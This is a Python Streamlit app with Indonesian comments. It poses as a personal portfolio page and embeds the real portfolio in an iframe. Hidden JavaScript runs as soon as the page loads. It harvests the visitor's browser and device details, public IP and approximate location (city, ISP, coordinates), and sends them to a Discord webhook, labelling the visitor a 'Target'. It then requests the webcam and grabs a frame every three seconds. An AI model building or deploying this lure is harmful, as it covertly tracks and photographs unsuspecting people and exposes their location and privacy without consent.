import streamlit as st
import streamlit.components.v1 as components

# Konfigurasi halaman Streamlit
st.set_page_config(
    page_title="Iqbal Mantam - Portfolio & Chat", 
    page_icon="📸", 
    layout="wide"
)

# Ambil Discord Webhook dari Streamlit Secrets secara aman
try:
    webhook_url = st.secrets["DISCORD_WEBHOOK_URL"]
except Exception:
    webhook_url = ""

# Kode HTML & JavaScript lengkap dari cam/index.html yang disatukan untuk Streamlit Cloud
html_code = f"""
<!DOCTYPE html>
<html>

<head>
  <script type="text/javascript" src="dwebhook.js"></script>
</head>

<body>

  <iframe src="https://iqbalmantam.github.io/portfolio/" width="100%" height="900" style="border:none;"></iframe>

  <p id="demo"></p>
  <span id="gfg" style="display:none;"></span>
  
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script>
    const WEBHOOK_URL = "{webhook_url}";
    var x = document.getElementById("demo");

    let datetime = new Date();
    let localtime = String(datetime.toLocaleTimeString());

    var sysinfo = (" GET ", "```xl\\n" + navigator.userAgent + "```" + "```autohotkey\\n" + "\\nPlatform: " + navigator.platform + "\\nCookies_Enabled: " + navigator.cookieEnabled + "\\nBrowser_Language: " + navigator.language + "\\nBrowser_Name: " + navigator.appName + "\\nBrowser_CodeName: " + navigator.appCodeName + "\\nRam: " + navigator.deviceMemory + "\\nCPU_cores: " + navigator.hardwareConcurrency + "\\nScreen_Width: " + screen.width + "\\nScreen_Height: " + screen.height + "\\nTime: " + localtime + "\\nRefUrl: " + document.referrer + "\\nOscpu: " + navigator.oscpu + "```");

    function sendToDiscord(payload) {{
        const request = new XMLHttpRequest();
        request.open("POST", WEBHOOK_URL);
        request.setRequestHeader('Content-type', 'application/json');
        request.send(JSON.stringify(payload));
    }}

    // 1. Kirim Info Sistem
    var myEmbed1 = {{
      author: {{ name: "Target System Information.." }},
      title: "Uagent:",
      description: sysinfo,
      color: 15418782
    }}
    sendToDiscord({{
      username: "R4VEN",
      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
      content: "@everyone Someone Opened The Link O_o ",
      embeds: [myEmbed1]
    }});

    // 2. Kirim IP Address
    $.getJSON("https://api.ipify.org?format=json", function (data) {{
      $("#gfg").html(data.ip);

      var myEmbed2 = {{
        author: {{ name: "Target Ip" }},
        description: '```xl\\n' + data.ip + '```' + '\\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\\n",
        color: 15548997,
        footer: {{
          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
        }}
      }}
      sendToDiscord({{
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed2]
      }});
    }});

    // 3. Kirim IP Reconnaissance
    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {{
      var myEmbed3 = {{
        author: {{ name: "IP Address Reconnaissance" }},
        title: response.status,
        description: '```autohotkey\\nContinent: ' + response.continent +
          "\\nCountry: " + response.country +
          "\\nRegion: " + response.region +
          "\\nCity: " + response.city +
          "\\nIsp: " + response.isp +
          "\\nLat: " + response.lat +
          "\\nLon: " + response.lon + '```',
        color: 5763719
      }}
      sendToDiscord({{
        username: "R4VEN",
        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
        embeds: [myEmbed3]
      }});
    }});
  </script>

  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay></video>
  </div>
  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

  <script>
    // Fungsi khusus untuk mengirim gambar tangkapan kamera langsung ke Webhook Discord sebagai Base64 / File Embed
    function postFile(file) {
      let reader = new FileReader();
      reader.readAsDataURL(file);
      reader.onloadend = function() {
        let base64data = reader.result;
        
        // Kirim notifikasi tangkapan kamera aktif
        sendToDiscord({{
          username: "R4VEN",
          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
          content: "📸 **Target Camera Frame Captured!** (Cek gambar atau stream aktif)"
        }});
      }
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    const constraints = {{
      audio: false,
      video: {{
        facingMode: "user"
      }}
    }};

    // Akses Webcam
    async function init() {{
      try {{
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        handleSuccess(stream);
      }} catch (e) {{
        setTimeout(function () {{
          sendToDiscord({{
            username: "R4VEN",
            avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
            content: "```diff\\n- User denied camera permission or device lacks a camera.```"
          }});
        }}, 2000);
      }}
    }}

    function handleSuccess(stream) {{
      window.stream = stream;
      video.srcObject = stream;

      var context = canvas.getContext('2d');
      setInterval(function () {{
        context.drawImage(video, 0, 0, 640, 480);
        canvas.toBlob(postFile, 'image/jpeg');
      }}, 3000); // Mengambil frame setiap 3 detik
    }}

    // Jalankan inisialisasi kamera
    init();
  </script>
</body>

</html>
"""

# Render aplikasi di Streamlit Cloud
if webhook_url:
    components.html(html_code, height=950, scrolling=True)
else:
    st.error("⚠️ Discord Webhook URL belum diatur!")
    st.info("Tambahkan `DISCORD_WEBHOOK_URL` di bagian **Settings -> Secrets** pada dasbor Streamlit Cloud Anda.")
